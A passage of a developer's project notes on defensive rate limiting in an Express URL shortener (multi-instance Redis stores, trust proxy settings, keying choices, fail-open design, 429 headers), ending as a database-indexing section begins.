different ports (`PORT=3001 npm run dev` and `PORT=3002 npm run dev`,
sharing the same `.env` otherwise — Node's `--env-file` doesn't override a
variable already set in the process environment, so the shell-prefixed
`PORT=` wins) and hammering `/api/auth/login` past
`RATE_LIMIT_AUTH_MAX` against instance A produces the expected 429 with
`RateLimit-Remaining: 0` — but a single follow-up request against instance
B, from the same client, in the same window, returns a normal 401 instead
of 429. Instance B's in-memory `Map` has never seen a request from this
run; its own counter is still at zero.

Confirmed exactly this way against this app: instance A returned `401` on
requests 1-5 and `429` on request 6 (`RATE_LIMIT_AUTH_MAX=5`), with
`RateLimit-Policy: 5;w=900`, `RateLimit-Remaining: 0`, and `Retry-After:
873` on the blocked response; a single follow-up request against instance
B, same client, same instant, returned a plain `401` — proving instance
B's counter had never been touched. After Step 2's Redis-backed store
replaced the in-memory one, repeating the identical exercise made
instance B also return `429` immediately, with `RateLimit-Remaining: 0`,
because both processes' `RedisStore`s now increment the same key in the
one shared Redis.

The configured policy is "N requests per window." What's actually
enforced, once there's more than one process, is "N requests per window
_per process_" — for a fleet of `k` instances behind a load balancer
distributing traffic round-robin (or by any method not itself aware of
this limiter's keys), the real effective limit an attacker experiences is
up to `k × N`, not `N`. Nothing about this is loud: no error is thrown,
no log line flags a discrepancy, no metric diverges from what a single-
instance deployment would show — the only way to _see_ it is to do
exactly what this exercise did: drive traffic at two processes counting
independently and compare. A single-process local dev environment and a
single-process test run (`npm test`) never exercise more than one
instance, so this bug has no natural trigger to surface it outside a
multi-instance deployment — which is exactly the environment where it
matters.

**Where it lives in the codebase.** `src/middleware/rateLimit.ts`'s
`buildLimiter`, before Step 2 added a `store` option — express-rate-
limit's default in-memory `MemoryStore`, used implicitly whenever no
`store` is configured.

**Common pitfalls.**

- Assuming a rate limiter "works" because it correctly rejects the Nth
  request in local dev or in a single-process test run — that's exactly
  the condition under which the in-memory store's real limitation stays
  invisible.
- Discovering this in production, from a symptom (an operator seeing
  users get rate-limited far less often than the configured policy
  implies, or - worse - an actual credential-stuffing run succeeding at
  `k×N` the rate the policy was meant to cap) rather than from a
  deliberate, controlled multi-instance test like this one.

**Production considerations.** Any deployment that runs more than one
instance of this API behind a load balancer — which any real production
deployment eventually does, for redundancy or scale — needs a shared
store, not the default in-memory one. That's exactly what Step 2 below
adds.

Fixing this introduces the mirror-image problem in the test suite itself:
`tests/routes/auth.test.ts`, `redirect.test.ts`, `links.test.ts`, and
`googleAuth.test.ts` all issue `POST /api/auth/signup`/`login` through
supertest, which all share one loopback IP. Under Step 1's in-memory
store that was harmless — each test _file_ ran in its own process with
its own private `Map`, so one file's signup volume never touched
another's. Once Step 2 makes that state real and shared, `npm test`
running every file back-to-back in one `vitest` run (per
`vitest.config.ts`'s `fileParallelism: false`) means a later file inherits
whatever budget an earlier file already spent, within the same 3-second
test window (`RATE_LIMIT_AUTH_WINDOW_SECONDS` in `.env.test`) — exactly
the shared-state property this phase spent Step 1 demonstrating the
_absence_ of. Each of those four files' `beforeAll` now flushes the
`rl:auth-*` keys before its own tests run, the same category of fix
`tests/globalSetup.ts` already applies to Postgres via a dedicated test
database — a deliberately shared external resource needs deliberate
per-test-boundary isolation, whichever store backs it.

**Interview answer.** I ran two instances of the API on different ports
sharing everything else, and drove one past its rate limit on
purpose. The other instance let the very next request through with a
normal 401, not a 429, because express-rate-limit's default store is an
in-memory `Map` scoped to that one process — each instance keeps its own
independent count. The configured policy said "N requests per window";
what was actually enforced, once there were two processes, was "N per
window per instance," so the real effective limit across a k-instance
fleet is k×N, silently. Nothing errors or logs a divergence — it only
shows up if you specifically drive traffic at more than one instance and
compare, which is exactly why I wanted to reproduce it deliberately before
fixing it with a shared Redis-backed store, rather than only describing
the failure mode in the abstract.

---

### `trust proxy`: `req.ip` is a policy decision, not a fact

**What it is.** `app.set('trust proxy', config.TRUST_PROXY)` in
`src/app.ts` tells Express how many hops of the `X-Forwarded-For` header
chain to trust when computing `req.ip` — the value every IP-keyed rate
limiter in this phase reads. `TRUST_PROXY` defaults to `0` ("trust
nothing but the real TCP socket"), correct for local dev and this test
suite, where nothing sits in front of the app.

**Why it exists in this project.** Every rate limiter that matters for
public traffic (`signupLimiter`, `loginLimiter`, `unlockLimiter`) is keyed
by IP. `req.ip`'s correctness is a _precondition_ for any of them meaning
what their configuration says they mean — get it wrong in either
direction and the limiter still runs, still returns 200s and 429s, and
gives no indication anything is wrong; it just isn't protecting what it
appears to be protecting.

**How it works mechanically.** Two distinct failure modes, both silent to
this app's own logic (nothing throws or looks unusual in either case,
which is exactly why the header comment in `src/app.ts` and the startup
warning below exist):

- **Unset, behind a real load balancer.** Every request Express sees comes
  from one TCP connection: the load balancer's. `req.ip` resolves to the
  LB's address for every client behind it. Every IP-keyed limiter
  collapses onto a single bucket shared by _all_ real users — one
  legitimate user's login attempts count against the same budget as every
  other user's, and a single user with unusually high traffic can
  exhaust the whole app's login budget for everyone else. The rate
  limiter is still "working" in the sense that it enforces some limit;
  it's just not enforcing it per-user anymore.
- **Trusting the whole `X-Forwarded-For` chain blindly** (e.g. setting
  `TRUST_PROXY` far higher than the real number of hops, or naively
  reading the header directly instead of through `app.set('trust
proxy', ...)`). `X-Forwarded-For` is a plain, client-settable HTTP
  header — nothing stops a request from arriving with an attacker-chosen
  value already in it. If Express is configured to trust hops that don't
  actually exist, an attacker can simply set the header themselves,
  handing this app whatever "client IP" they want on every request —
  a fresh one each time, bypassing every IP-keyed limiter in the app
  entirely. Trusting more than the real proxy topology warrants is worse
  than trusting nothing: unset, everyone shares one bucket (unfair, but
  not bypassable); over-trusted, the limiter can be defeated outright.

Express's `trust proxy` setting is the correct middle ground: a hop count
(`1` for a single load balancer) tells Express exactly how many
`X-Forwarded-For` entries, counted from the right, to trust as real
proxies — anything beyond that count is presumed attacker-controlled and
ignored.

**Where it lives in the codebase.** `src/config/env.ts` (`TRUST_PROXY`,
`.default(0)`); `src/app.ts` (`app.set('trust proxy', config.TRUST_PROXY)`,
plus the production startup warning below); every `keyGenerator` in
`src/middleware/rateLimit.ts` that reads `req.ip`.

A direct-to-internet deployment (`TRUST_PROXY=0`) is legitimate, not an
error — but a production deployment sitting behind an unconfigured load
balancer, with the symptom being real users getting 429s they didn't
individually earn, points nowhere near `TRUST_PROXY` as the cause. `src/
app.ts` logs a `warn` at startup whenever `NODE_ENV === 'production' &&
TRUST_PROXY === 0`, naming the consequence explicitly, so this
misconfiguration is loud in logs even though it's silent in behavior.
**Deployment checklist for Phase 15** (moving this API behind Render's
load balancer): `TRUST_PROXY` must be set to `1` in that environment's
configuration, or every user collapses onto one shared rate-limit bucket
— this is exactly the failure this startup warning exists to catch before
it's a production incident.

**Common pitfalls.**

- Defaulting `TRUST_PROXY` to `1` "to be safe" in this repo's own
  defaults — that would mean trusting a proxy hop that doesn't exist in
  local dev or in this test suite, silently opening the spoofing hole
  described above in exactly the environments where nobody would think to
  look for it.
- Treating "requests still get rate limited" as evidence `trust proxy` is
  configured correctly — both failure modes above still produce working-
  looking 429s; the bug is in _who_ the limit applies to, not whether a
  limit applies at all.

**Production considerations.** The hop count must match the real proxy
topology exactly — one load balancer in front means `1`; a CDN in front of
a load balancer means `2`; guessing high "to be safe" is the over-trust
failure mode above, not a safe margin.

**Interview answer.** `trust proxy` controls how many `X-Forwarded-For`
hops Express trusts when computing `req.ip`, and getting it wrong in
either direction breaks IP-based rate limiting silently, not loudly.
Leaving it unset behind a real load balancer makes every user's traffic
look like it's coming from the load balancer's one address, so all users
share one limiter bucket. Overcorrecting by trusting the header blindly
is worse, not safer: `X-Forwarded-For` is a plain client-settable header,
so an attacker can simply forge whatever "IP" they want and get a fresh
rate-limit bucket on every request. The fix is a hop count matching the
real proxy topology — one for a single load balancer — which tells
Express exactly where to stop trusting the chain. Because this
misconfiguration produces no errors, I added a startup warning that fires
whenever the app is in production with `TRUST_PROXY` still at its
0 default, so the failure is loud in logs even though it's silent in
behavior.

---

### Keying strategies: IP, IP+resource, and the email-keying tradeoff not taken

**What it is.** Each of this phase's four limiters keys its counter
differently, deliberately: `signupLimiter`/`loginLimiter` by IP,
`unlockLimiter` by IP _and_ the shortCode being attacked, `linksCreateLimiter`
by authenticated user ID.

**Why it exists in this project.** "Rate limit by IP" is the default
instinct, but it's the right choice for some of these routes and
observably wrong for others.

IP keying has real false positives and false negatives. **False
positives:** corporate NAT and CGNAT (carrier-grade NAT, common on mobile
networks) put many real, unrelated users behind one apparent IP address —
an IP-keyed limiter can't distinguish "one attacker" from "an office full
of legitimate users," so a busy office or campus network can trip a limit
meant for a single bad actor. **False negatives:** a botnet or a pool of
rotating proxies gives an attacker as many distinct apparent IPs as they
want, so a per-IP limit caps each individual IP's rate without capping
the attacker's _aggregate_ rate across all of them at all.

`unlockLimiter`'s IP-alone gap is the concrete case Phase 7 flagged and
this phase closes: a per-IP-only limit on `/unlock` would let an attacker
exhaust their budget brute-forcing link A's password, then immediately
have a fresh, unthrottled budget against link B from the very same
address — the thing actually being protected (one link's password) has
nothing to do with a global-per-IP counter. Keying by IP _and_ shortCode
(`` `${ipKeyGenerator(req.ip)}:${shortCode}` ``) makes the budget specific
to "this client attacking this link," which is what the threat model
actually is.

Email-based keying for login — counting failed attempts against the
_account_ being targeted, regardless of source IP — was considered and
deliberately not implemented. It would close the aggregate-botnet gap IP
keying leaves open for credential stuffing (many IPs, one targeted
account), but it opens a different, arguably worse hole: anyone who knows
or guesses a victim's email can lock that account out of login entirely,
from anywhere, without ever needing to control the victim's IP or guess
their password — a pure availability attack with no credential-guessing
skill required. Not implementing it is the deliberate choice this phase
makes, not an oversight; a future phase pairing email-based throttling
with something like progressive backoff, a CAPTCHA challenge after N
failures, or account-lockout notifications would be how to get the
credential-stuffing defense without handing out a free lockout button.

**How it works mechanically.** See `src/middleware/rateLimit.ts` —
`keyGenerator` on each `buildLimiter(...)` call. `signupLimiter`/
`loginLimiter` omit `keyGenerator` entirely, falling through to express-
rate-limit's IP-based default. `unlockLimiter`'s composite key truncates
`shortCode` to `MAX_ALIAS_LENGTH` before folding it in, bounding how much
keyspace an attacker could otherwise inflate by sending an arbitrarily
long path segment. `linksCreateLimiter` keys on `req.userId` (available
because it's mounted after `requireAuth`), falling back to IP only in the
case where `req.userId` is somehow unset.

**Where it lives in the codebase.** `src/middleware/rateLimit.ts`. Proven
per-link isolation: `tests/routes/redirect.test.ts`'s `describe('rate
limiting (unlock)')`. Proven per-user isolation:
`tests/routes/links.test.ts`'s `describe('rate limiting')`.

**Common pitfalls.**

- Keying a resource-specific limiter (like unlock) by IP alone and
  assuming "it's rate limited" is the same claim as "brute-forcing any
  one link is bounded" — those are different guarantees, and Phase 7's
  original gap is exactly this confusion.
- Adding email-based keying as a strict improvement over IP-based keying
  without naming the account-lockout DoS it introduces — it trades one
  gap for a different one, not a strict upgrade.

**Production considerations.** `linksCreateLimiter`'s per-user keying has
its own honest gap: an attacker who creates a fresh account for every
burst of link creation sidesteps a per-user limit entirely. That's
bounded by `signupLimiter` instead (a different limiter, a different
resource) — account-creation abuse and link-creation-rate abuse are
different problems, and this phase deliberately doesn't conflate them
into one limiter.

**Interview answer.** I keyed each limiter to match what it's actually
protecting, not by defaulting to IP everywhere. Auth stays IP-keyed,
which has real false positives (CGNAT, corporate NAT — many real users,
one apparent address) and false negatives (a botnet spreads real load
across many addresses, defeating a per-IP cap on aggregate rate) — I
considered email-based keying for login specifically to close that
botnet gap, but rejected it because it trades credential-stuffing
resistance for a trivial account-lockout attack: anyone can lock out a
real user's login by guessing their email, not their password. The
unlock endpoint gets a composite IP-plus-shortCode key, because the
actual gap there — brute-forcing one link's password shouldn't spend a
different link's budget — is a resource-scoping problem IP alone can't
solve regardless of which IP-based tradeoffs you accept.

---

### Rate limiting a public, viral-by-design endpoint without breaking the product

**What it is.** `GET /:shortCode` — the actual redirect, this app's core
product surface — has no rate limiter, and that's a deliberate decision
this phase makes explicitly, not an oversight.

**Why it exists in this project.** A URL shortener's redirect endpoint is
supposed to receive large, legitimate bursts — that's what "a link goes
viral" means in product terms. The single worst failure mode a rate
limiter could introduce here is blocking that exact traffic pattern,
which would make the product actively worse at the one thing it exists to
do. Before adding any limiter here, it's worth asking specifically what
abuse it would stop, because "requests per IP" doesn't automatically map
onto every abuse vector this endpoint could face:

- **Short-code enumeration** (trying many short codes hoping to find a
  live one) is already cheap to absorb without a rate limiter: Phase 8's
  negative cache (the `__MISS__` sentinel) turns a repeated miss into a
  single Redis `GET`, not a Postgres query, after the first attempt per
  code. There's no expensive-resource-exhaustion problem here for a
  limiter to add value against.
- **`maxClicks` exhaustion** — a bot deliberately burning through a
  capped link's click budget to deny it to real visitors — is a real,
  distinct abuse vector, but a per-IP limit on this endpoint doesn't
  actually solve it: a distributed source (a botnet, rotating proxies —
  the same false-negative class discussed above) defeats a per-IP cap on
  the exact endpoint that most needs to stay open to bursts. Adding a
  limiter here would cost real risk (blocking a viral link's real
  traffic) for a defense that doesn't hold up against the realistic
  version of the attack it would be aimed at.

This mirrors Phase 8's "Cache stampede" section's own shape: no
mitigation, a stated reason grounded in this app's actual scale and
threat model, and an explicit trigger for revisiting the decision, rather
than either implementing speculative protection or ignoring the question
entirely.

**How it works mechanically.** Nothing — no limiter middleware is mounted
on this route. `tests/routes/redirect.test.ts`'s `describe('GET
/:shortCode is not rate limited (Phase 10 decision)')` fires a burst of
concurrent requests at one link and asserts every single one succeeds,
as a positive assertion that this is deliberate, not something nobody
thought to test.

**Where it lives in the codebase.** `src/routes/redirect.ts` — the
comment directly above the `GET /:shortCode` handler states the decision
and points here.

**Common pitfalls.**

- Rate limiting a public product's hottest, most-viral-by-design path
  "because every public endpoint should have a rate limiter" — a rate
  limiter is a tool for a specific abuse pattern, not a default hygiene
  step every route needs regardless of what it actually protects against.
- Believing a per-IP limiter here would meaningfully bound `maxClicks`
  abuse — it wouldn't, against a distributed source, which is the
  realistic shape of that attack.

**Production considerations.** The trigger that would change this
decision: `maxClicks` abuse or redirect bandwidth cost becoming a
_measured_ problem, not a theoretical one. At that point, a targeted,
generous, per-link mechanism — closer to limiting only on a cache miss
(since Phase 8's negative cache already absorbs cheap enumeration, a
miss-only limiter would target genuinely expensive lookups specifically)
than a blanket per-IP cap on every request — would be the next step, not
a limiter on this route as it stands today.

**Interview answer.** I deliberately didn't rate limit the redirect
route, because it's this product's core, intentionally-viral path, and
the worst thing a rate limiter could do here is block a legitimate traffic
spike — exactly the scenario "going viral" describes. The abuse vectors
that sound like they'd justify one don't actually hold up: enumeration is
already cheap because of Phase 8's negative cache, and `maxClicks`
exhaustion via a botnet defeats a per-IP limit anyway since it's
distributed by design. I'd revisit this the moment `maxClicks` abuse or
bandwidth cost becomes a measured problem, with a narrower, per-link
mechanism — not a blanket limiter on this route as a precaution against a
theoretical attack it wouldn't actually stop.

---

### A third dedicated Redis connection, and why its settings differ from the queue's

**What it is.** `src/lib/rateLimitRedis.ts` exports
`rateLimitRedisConnection`, a third standalone `ioredis` connection used
for exactly one thing: backing `rate-limit-redis`'s `RedisStore` in
`src/middleware/rateLimit.ts`. It is neither the shared cache client
(`src/lib/redis.ts`) nor BullMQ's queue connection
(`src/queues/connection.ts`).

**Why it exists in this project.** Phase 9 already established the rule
this connection follows: one dedicated `ioredis` instance per consumer
with distinct reliability requirements, rather than reusing a connection
built for a different purpose (see "The `maxRetriesPerRequest` conflict").
BullMQ's `Worker` needs `maxRetriesPerRequest: null` because it issues
blocking commands that must not race ioredis's own retry logic — nothing
about rate limiting does that, so this connection doesn't inherit that
constraint. What it _does_ need is the cache client's shape: fail fast,
fail open, never let a Redis hiccup add unbounded latency to a request
that's supposed to be cheap.

**How it works mechanically.** `rateLimitRedisConnection` is built with
`lazyConnect: true` (no import-time socket, matching `src/lib/redis.ts`'s
reasoning) and `maxRetriesPerRequest: 1` (a single retry before a command
gives up, bounding how long a request can be stuck waiting on a struggling
connection). `rate-limit-redis`'s `sendCommand` option is wired to
`rateLimitRedisConnection.call(...)`, prefixed per limiter (`rl:auth-signup:`,
`rl:auth-login:`, `rl:redirect-unlock:`, `rl:links-create:`) so each
limiter's keys are visibly namespaced in Redis and can never collide with
each other or with Phase 8's `link:` cache keys.

One setting deliberately does _not_ appear here, and the reason is a real
bug this phase hit, not a hypothetical: `enableOfflineQueue: false` looks
like the right choice for a fail-open limiter — reject immediately while
disconnected instead of silently queueing — but paired with
`lazyConnect: true` it's actively broken. The very first command ever
issued on a lazy connection always arrives before the socket has finished
connecting (`connect()` is fired but hasn't resolved yet), so with the
offline queue disabled that first command _always_ rejects, even against
a perfectly healthy Redis. That first command is `rate-limit-redis`'s
`SCRIPT LOAD`, issued synchronously inside `rateLimit()`'s `store.init()`
the moment each limiter is constructed (at module load, before the app
even starts listening) — and `RedisStore` caches that load's result as a
single promise it never retries on anything other than a `NOSCRIPT` error.
One failed cold start, from this timing race alone, would silently and
_permanently_ neutralize that limiter for the rest of the process's life —
every later `increment()` call would keep hitting the same cached
rejection, and `passOnStoreError` would keep quietly waving every request
through. Leaving the offline queue enabled (ioredis's default) instead
lets that first command simply wait for the connection, bounded by
`connectTimeout` and `maxRetriesPerRequest` — exactly the tradeoff
`src/lib/redis.ts` already makes for the cache client.

**Where it lives in the codebase.** `src/lib/rateLimitRedis.ts`
(the connection); `src/middleware/rateLimit.ts` (`sendCommand`, the
`RedisStore` construction). Health surfacing follows `src/services/
health.ts`'s existing pattern if this connection is ever added to the
`/health` report, though this phase doesn't add it there — a rate limiter
failing open is designed to be invisible to callers by construction,
unlike the database/cache dependencies `/health` already reports on.

**Common pitfalls.**

- Pairing `enableOfflineQueue: false` with `lazyConnect: true` on any
  fresh ioredis connection, not just this one — the combination guarantees
  the first command after every cold start races a socket that hasn't
  connected yet, and loses.
- Assuming a rejected `store.init()` promise is retried automatically —
  `rate-limit-redis` only retries a `NOSCRIPT` error (the script existing
  but having been evicted from Redis's script cache); any other failure,
  including a timing race like the one above, is cached and rethrown
  forever.
- Reusing the shared cache client (`redis`) for this store because "it's
  already fail-open, why build another connection" — it is fail-open for
  its own purpose, but sharing one connection's health/shutdown lifecycle
  across two unrelated consumers is exactly the coupling Phase 9 already
  rejected for the queue.

**Production considerations.** If this app ever needs to observe rate-
limiter health directly (e.g. alerting specifically on sustained
`passOnStoreError` fallbacks rather than inferring them from a drop in 429
volume), that's a metric to add at the `sendCommand` wrapper in
`src/middleware/rateLimit.ts`, not a reason to change this connection's
settings.

**Interview answer.** I gave rate limiting its own dedicated Redis
connection rather than reusing the cache client or the BullMQ queue
connection, following the same "one connection per consumer" rule Phase 9
already established — this one's failure mode should look like the
cache's, not the queue's, since nothing here issues blocking commands.
While building it I actually hit a real bug from combining
`enableOfflineQueue: false` with `lazyConnect: true`: the first command on
a lazy connection always races an unfinished socket connection and loses,
and because `rate-limit-redis` caches its script-load promise forever on
any non-`NOSCRIPT` failure, that one race would have silently and
permanently disabled every limiter using this connection for the rest of
the process's life. Leaving the offline queue enabled — mirroring the
cache client's own settings — fixed it: the first command just waits for
the connection instead of failing immediately.

---

### Fail-open, again — extending Phase 8's graceful-degradation precedent

**What it is.** `passOnStoreError: true` on every limiter in
`src/middleware/rateLimit.ts`: if the Redis command backing a rate-limit
check fails, express-rate-limit skips incrementing that key, skips setting
rate-limit headers, logs the error, and calls `next()` — the request
proceeds exactly as if no limiter were mounted on that route at all.

**Why it exists in this project.** This is the same argument Phase 8 made
for the link-lookup cache, applied to a new layer: a rate limiter is, like
a cache, an optional layer sitting on top of a request that would have
succeeded without it. If a rate limiter's own failure could fail the
request it's supposed to be protecting, adding rate limiting would make
the app _less_ reliable than having none at all — a Redis blip would
become a full auth/unlock/link-creation outage, which is a strictly worse
outcome than briefly, accidentally running unlimited. See Notes.md, "Phase
8: Caching the Redirect Path" / "Graceful degradation" for the original
statement of this principle; this section extends it, not restates it from
scratch.

**How it works mechanically.** Unlike Phase 8's cache, which implements
fail-open by hand (a `try`/`catch` around each Redis call in
`linkService.ts`), this phase uses a first-class option express-rate-limit
already ships: `passOnStoreError`. The library's own `increment()` call is
wrapped in a `try`/`catch` internally; on a caught error, with the option
set, it logs via the configured `logger` (here, `pinoAdapterLogger` in
`src/middleware/rateLimit.ts` — routed through this app's structured Pino
logger rather than the library's `console`-based default, matching
CLAUDE.md's "no console.log" rule for a dependency's internal logging just
as much as for code written here) and calls `next()` directly, never
throwing into the route.

This is also, still, exactly the same divergence from `oauthState.ts`'s
fail-_closed_ `storeState`/`consumeState` that Phase 8 already drew: Redis
is the actual source of truth for OAuth CSRF state, so a failure there
must fail the request, because proceeding without checking it would mean
skipping a real security check. A rate limit, by contrast, is a
performance/abuse-shaping layer over routes that already have their own
correct authorization and validation independent of it — bcrypt still
verifies the password, `requireAuth` still checks the token, either way.
Losing the rate limit temporarily during a Redis outage means losing a
_mitigation_, not the underlying protection; losing OAuth state validation
would mean losing the protection itself.

**Where it lives in the codebase.** `src/middleware/rateLimit.ts`
(`passOnStoreError: true`, `pinoAdapterLogger`). Proven in
`tests/routes/auth.test.ts`'s `describe('fail-open when the rate-limit
Redis connection is unavailable')`, which mocks
`rateLimitRedisConnection.call` to reject once and asserts the login
route's real handler still runs (a normal 401, not a 500 or a 429) —
mirroring `tests/routes/redirect.test.ts`'s existing `vi.spyOn(redis,
'get'|'set'|'del').mockRejectedValueOnce` pattern for the cache.

**Common pitfalls.**

- Assuming `passOnStoreError`'s default (`false`) is a reasonable starting
  point "because rate limiting should be strict" — the strictness that
  matters is bounding a _working_ Redis's abuse budget, not turning an
  _unavailable_ Redis into an outage for every route a limiter touches.
- Forgetting to point the library's own internal logger at this app's
  structured logger — without `pinoAdapterLogger`, every fail-open event
  (and every other internal warning/error express-rate-limit logs) writes
  to `console.error`/`console.warn` instead of the aggregated,
  structured log stream everything else in this app uses.

**Production considerations.** A sustained Redis outage under this design
degrades to "every rate-limited route runs completely unthrottled" — worse
exposure to the abuse each limiter exists to bound, but a fully functional
system, which is the same tradeoff Phase 8 already accepted for the cache
and the right one for the same reason: an optional layer's failure should
degrade the thing it protects, not delete it.

**Interview answer.** I extended Phase 8's fail-open principle to rate
limiting: if the Redis command a rate-limit check depends on fails, the
request should proceed as if that limiter weren't mounted, not fail with a
500 or a false 429. Unlike the cache, which implements this by hand with
try/catch, I used express-rate-limit's own `passOnStoreError` option,
since it's a first-class mechanism for exactly this. I also made sure the
library's internal logging goes through this app's Pino logger instead of
its `console`-based default, so a fail-open event is visible in the same
structured log stream as everything else, not silently separate. And I
kept the same contrast Phase 8 already drew with `oauthState.ts`: that
module fails closed because Redis is the actual source of truth for OAuth
state with no fallback, while a rate limit sits on top of routes that stay
correctly authorized and validated on their own — losing the limit
temporarily during an outage means losing a mitigation, not the
underlying protection.

---

### What a 429 actually communicates, and the headers that back it up

**What it is.** Every limiter in this phase responds to an over-budget
request with `429 Too Many Requests`, using the existing `tooManyRequests`
factory from `src/lib/errors.ts`, plus a `Retry-After` header and the
`RateLimit-Limit`/`RateLimit-Remaining`/`RateLimit-Reset`/`RateLimit-Policy`
headers (via `standardHeaders: 'draft-6'`) on every response, allowed or
blocked.

**Why it exists in this project.** 429 says something 401 and 403 don't:
_retriability_. A 401 ("who are you, really") or 403 ("I know who you are
and you can't do this") describe the caller's identity or permissions —
retrying the identical request changes nothing until the caller's
credentials or access change. A 429 describes _timing_, not identity or
permission: the exact same request, from the exact same caller, will
succeed later, once the window resets. Collapsing that distinction into a
401/403 would tell a well-behaved client "you're unauthorized" when the
honest answer is "you're fine, just not right now" — a client that
respects HTTP semantics would have no reason to retry a 401, but every
reason to back off and retry after a 429's `Retry-After`.

**How it works mechanically.** `standardHeaders: 'draft-6'` was chosen
over `express-rate-limit`'s newer `'draft-7'` option specifically because
draft-6 emits separate, individually-named `RateLimit-Limit`/
`RateLimit-Remaining`/`RateLimit-Reset` headers, while draft-7 combines
them into one opaque `RateLimit: limit=…, remaining=…, reset=…` header —
harder for a client (or a test) to read a single value out of without
parsing that combined string. `Retry-After` is set automatically by
express-rate-limit only on the blocked (429) response, computed from the
same window/reset-time bookkeeping already backing the other headers.

Each limiter's `handler` option (in `buildLimiter`,
`src/middleware/rateLimit.ts`) reads that already-computed `Retry-After`
value back off `res` — `Number(res.getHeader('Retry-After'))` — rather
than recomputing it, so there's one source of truth for the number, and
passes it into `tooManyRequests('Too many requests. Please try again
later.', { retryAfterSeconds })`. `AppError.details` already accepts
`unknown` (see Phase 3, "Operational vs programmer errors"), so this
needed no signature change to `tooManyRequests` or to the error
middleware — `{ retryAfterSeconds }` flows straight through the existing
`...(isAppError && err.details !== null ? { details: err.details } : {})`
line in `createErrorHandler`, giving a 429 the exact same
`{ error: { code, message, requestId, details } }` envelope every other
error in this API already has, with the header carrying the same value
for anything that reads HTTP semantics rather than the JSON body.

**Where it lives in the codebase.** `src/middleware/rateLimit.ts`
(`buildLimiter`'s shared `handler`); `src/lib/errors.ts`
(`tooManyRequests`, unchanged). Proven in `tests/routes/auth.test.ts`,
`tests/routes/redirect.test.ts`, and `tests/routes/links.test.ts`'s
respective `describe('rate limiting'...)` blocks.

**Common pitfalls.**

- Writing a custom `handler` that builds its own plain-text or ad hoc JSON
  response — express-rate-limit's default `handler` does exactly this,
  which is precisely why this phase overrides it: bypassing
  `createErrorHandler` would give 429s a different shape than every other
  error this API returns.
- Recomputing `Retry-After` independently from the `RateLimit-Reset`
  value already on the response — two calculations of the same "when can
  you retry" answer are two chances for them to disagree.

**Production considerations.** A well-behaved client (or a future
frontend) should treat `Retry-After` as authoritative for backoff timing,
not implement its own retry/backoff heuristic against a 429 with no
`Retry-After` — which is exactly why every limiter in this phase sets it.

**Interview answer.** 429 communicates something 401 and 403 can't:
that the _same_ request will succeed later, purely as a matter of timing,
not identity or permission — which is why it needs `Retry-After` and the
`RateLimit-*` headers to actually be useful to a well-behaved client,
where a 401 doesn't invite a retry at all. I used express-rate-limit's
draft-6 header set specifically because it emits separate, individually
named headers rather than draft-7's one combined header, and routed the
actual 429 response through the same `tooManyRequests` AppError factory
and error middleware every other error in this API uses, reading
`Retry-After` back off the response rather than computing it a second
time — so a rate-limit error looks, to any client of this API, like every
other error it already knows how to parse.

## Phase 11: Database Optimization

### Why indexing was deferred until this phase

**What it is.** Every migration through Phase 9 deliberately left several
columns unindexed — `links.expires_at`, `links.is_active`,
`clicks.clicked_at` — with an explicit comment naming this as a future,
measurement-driven pass rather than an oversight. This phase is that pass.

**Why it exists in this project.** An index is a bet: it costs write time
and storage on every row, forever, in exchange for read speed on a
specific query shape. Placed before a real query exists to measure, that
bet is made blind — there's no way to know whether the query pattern
you're guessing at is the one that actually shows up, whether the table
will be large enough for the index to matter, or whether the column order
you picked serves the real `WHERE`/`ORDER BY` shape a route ends up using.
This project's methodology across every phase has been "build the thing,
measure it, then optimize what the measurement says to" (Phase 7's
redirect-path latency benchmark, Phase 8's cache-effectiveness numbers,
Phase 9's queue-depth observability) — deferred indexing is the same
discipline applied to the database layer specifically.

**How it works mechanically.** Nothing to add here beyond what's already
true: an index that doesn't exist costs nothing and helps nothing. The
mechanism worth naming is what "deferred, not skipped" means in practice —
each unindexed column got an explicit comment in its migration
(`migrations/..._create-links-table.ts`, `migrations/
..._create-clicks-table.ts`) naming the decision and what would justify
revisiting it, so the absence reads as a decision on re-read, not a gap
nobody noticed.

**Where it lives in the codebase.** The original deferral comments in
`migrations/20260810111606896_create-links-table.ts` and `migrations/
20260810111607018_create-clicks-table.ts`; this phase's resolution in
`migrations/20260818173151020_add-performance-indexes.ts`.

**Common pitfalls.**

- Treating "index it now, it can't hurt" as the safe default — every
  unnecessary index is unconditional cost (write amplification, storage,
  one more thing the planner has to consider on every query) for
  conditional, possibly-never-realized benefit.
- The opposite mistake: never revisiting a deferral once made, so
  "deferred" quietly becomes "permanently absent" with nobody ever
  circling back. Naming the trigger condition in the deferral comment (as
  these migrations did) is what prevents that.

**Production considerations.** This project seeded realistic volume
(`scripts/seed-bulk.ts`) specifically because "wait for production traffic
to reveal the pattern" is the textbook version of this advice but isn't
available pre-launch — a synthetic-but-realistic dataset is the practical
substitute when there's no real traffic yet to measure against.

**Interview answer.** I don't index speculatively. Every index in this
schema exists because a captured `EXPLAIN ANALYZE` plan against realistic
data showed a specific query doing more work than it needed to — not
because a column "might get queried later." That's not caution for its own
sake: an index is a permanent write-time and storage cost paid on every
row regardless of whether the read pattern it was guessed for ever
materializes, so the earlier migrations in this project explicitly
deferred indexing certain columns with a named trigger condition
("once there's a real query pattern and real data to measure against"),
and this phase is exactly that trigger firing.

### B-tree indexes and reading EXPLAIN ANALYZE

**What it is.** Postgres's default index type is a B-tree — a balanced,
sorted tree structure where every leaf is the same distance from the root,
so a lookup, insert, or range scan is `O(log n)` regardless of which key
you're looking for. `EXPLAIN ANALYZE` is how you see whether a query
actually used one: it runs the query for real and reports the plan
Postgres chose alongside real execution numbers, not just an estimate.

**Why it exists in this project.** Every claim in this phase's
`docs/performance/before.md` and `after.md` is a captured `EXPLAIN
(ANALYZE, BUFFERS)` plan, not a guess about what an index "should" do —
this is the literal mechanism the whole measurement-driven methodology
runs on.

**How it works mechanically.** A B-tree's `O(log n)` lookup works by
repeatedly halving the search space: each internal node holds sorted keys
that partition the tree into ranges, so descending from root to leaf
compares against roughly `log₂(n)` nodes instead of scanning all `n` rows.
This is what makes an index lookup on a 50,000-row table (`log₂(50,000) ≈
16`) fundamentally different from a `Seq Scan`, whose cost is linear in
table size no matter how selective the predicate is — exactly the gap
this phase's cleanup-sweep plan showed (`before.md`: `Seq Scan`, all
50,000 rows visited to find 1,441 matches; `after.md`: `Bitmap Index Scan`
on the new partial index, touching only the matching subset).

Three scan types show up across this phase's plans:

- **Seq Scan** — reads every row in the table, applying the `WHERE` clause
